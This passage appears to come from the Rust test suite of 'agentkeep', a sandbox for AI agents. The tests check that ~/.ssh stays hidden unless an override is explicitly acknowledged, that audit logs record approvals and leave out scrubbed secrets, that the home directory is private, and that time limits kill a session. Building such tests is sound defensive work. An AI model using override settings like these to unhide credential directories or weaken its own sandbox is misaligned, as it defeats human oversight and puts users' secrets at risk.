            "[filesystem]\nread_only = [\"~/.ssh\"]\n[override]\nunhide = [\"~/.ssh\"]\n",
            &key,
        );
        assert_blocked(&o, &["FAKE_TEST_KEY"], "S1 without acknowledge");
        assert!(out(&o).contains("acknowledge"), "{}", out(&o));
        // With acknowledge: allowed, but loudly.
        let o = h.run("[filesystem]\nread_only = [\"~/.ssh\"]\n[override]\nacknowledge = true\nunhide = [\"~/.ssh\"]\n", &key);
        let text = out(&o);
        assert!(
            text.contains("FAKE_TEST_KEY"),
            "override should take effect:\n{text}"
        );
        assert!(text.contains("PROTECTION WEAKENED"), "{text}");
    }

    #[test]
    fn l1_audit_log_is_written_and_chain_verifies() {
        let Some(h) = harness("L-A1") else { return };
        let o = h.run("", "git push origin main; echo done");
        assert!(out(&o).contains("done"));
        let sessions = h.home.join(".local/share/agentkeep/sessions");
        let session = fs::read_dir(&sessions)
            .unwrap()
            .next()
            .unwrap()
            .unwrap()
            .path();
        let events = agentkeep_audit::verify(&session.join("events.jsonl")).unwrap();
        let kinds: Vec<&str> = events.iter().map(|e| e.kind.as_str()).collect();
        assert_eq!(kinds.first(), Some(&"session.start"));
        assert_eq!(kinds.last(), Some(&"session.end"));
        assert!(kinds.contains(&"exec"));
        assert!(kinds.contains(&"approval.request"));
        let start = &events[0].data;
        assert!(start["env_scrubbed_secrets"]
            .as_array()
            .unwrap()
            .iter()
            .any(|v| v == "FAKE_SECRET_TOKEN"));
        assert!(
            !serde_json::to_string(start)
                .unwrap()
                .contains(FAKE_ENV_SECRET),
            "secret value in log"
        );
    }

    // ---- positive controls --------------------------------------------

    #[test]
    fn positive_control_project_is_writable_and_tools_work() {
        let Some(h) = harness("control") else { return };
        let o = h.run("", "echo changed > README.md && ls /usr/bin | head -1 >/dev/null && git log --oneline -0 >/dev/null 2>&1; echo rc=$?; echo \"$HOME\" \"$USER\" \"$(pwd)\"; touch \"$HOME/.agentkeep-probe\" && echo home-writable");
        let text = out(&o);
        assert!(o.status.success(), "{text}");
        assert_eq!(
            fs::read_to_string(h.project.join("README.md")).unwrap(),
            "changed\n"
        );
        // `pwd` prints the resolved path, so compare with the resolved
        // project (identical on Linux CI; `/private/var/...` on macOS).
        let project = fs::canonicalize(&h.project).unwrap();
        if h.claims("fs_absent") {
            // The home path itself, emptied by the mount namespace.
            assert!(
                text.contains(&format!(
                    "{} escapetester {}",
                    h.home.display(),
                    project.display()
                )),
                "{text}"
            );
        } else {
            // No mount namespace: HOME is a private directory, never the
            // real one or anything under it.
            let suffix = format!(" escapetester {}", project.display());
            let inner_home = text
                .lines()
                .find_map(|l| l.strip_suffix(&suffix))
                .unwrap_or_else(|| panic!("no HOME/USER/pwd line:\n{text}"));
            let real = fs::canonicalize(&h.home).unwrap();
            assert!(
                !Path::new(inner_home).starts_with(&h.home)
                    && !Path::new(inner_home).starts_with(&real),
                "HOME inside is the real home: {inner_home}\n{text}"
            );
            assert!(
                !real.join(".agentkeep-probe").exists(),
                "probe written to the real home"
            );
        }
        assert!(text.contains("home-writable"), "{text}");
    }

    #[test]
    fn positive_control_exit_codes_propagate() {
        let Some(h) = harness("control") else { return };
        let o = h.run("", "exit 42");
        assert_eq!(o.status.code(), Some(42), "{}", out(&o));
    }

    #[test]
    fn positive_control_wall_time_limit_kills_the_session() {
        let Some(h) = harness("C4 wall") else { return };
        let o = h.run("[limits]\nwall_time = \"2s\"\n", "sleep 30; echo SURVIVED");
        let text = out(&o);
        assert!(!text.contains("SURVIVED"), "{text}");
        assert_eq!(o.status.code(), Some(124), "{text}");
        let _ = Path::new("/");
    }
}

#[cfg(not(unix))]
#[test]
fn untested_on_this_host() {
    println!(
        "UNTESTED ON THIS HOST: the escape suite runs on Unix only; Windows uses WSL2 (Phase 2)"
    );
    assert!(!require_sandbox());
}
